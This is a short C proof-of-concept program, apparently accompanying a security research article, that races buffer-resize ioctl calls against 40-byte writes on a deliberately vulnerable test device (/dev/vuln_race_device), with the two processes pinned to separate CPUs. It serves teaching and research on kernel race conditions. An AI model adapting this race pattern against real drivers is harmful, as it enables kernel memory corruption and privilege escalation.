// SPDX-License-Identifier: GPL-2.0

// Buggy code, DO NOT USE. See https://research.nccgroup.com/?p=18577

// PoC race in shared state (buf, buf_size) accessible from multiple threads.

#define _GNU_SOURCE
#include <stdio.h>
#include <string.h>
#include <unistd.h>
#include <sched.h>
#include <fcntl.h>
#include <sys/ioctl.h>


#define VULN_SETUP_BUF _IO('v', 3)


int main(int argc, char **argv)
{
	int fd = open("/dev/vuln_race_device", O_RDWR);
	if (fd < 0) {
		perror("open error");
		return -1;
	}

	int child = fork() == 0;

	cpu_set_t set;
	CPU_ZERO(&set);
	CPU_SET(child, &set);
	if (sched_setaffinity(getpid(), sizeof(set), &set) < 0) {
		perror("sched_setaffinity error");
		return -1;
	}

	if (child) {
		while (1) {
			ioctl(fd, VULN_SETUP_BUF, 39);
			ioctl(fd, VULN_SETUP_BUF, 40);
		}
	} else {
		char buf[40];
		memset(buf, 'A', sizeof(buf));

		while (1) {
			write(fd, buf, sizeof(buf));
		}
	}

	return 0;
}
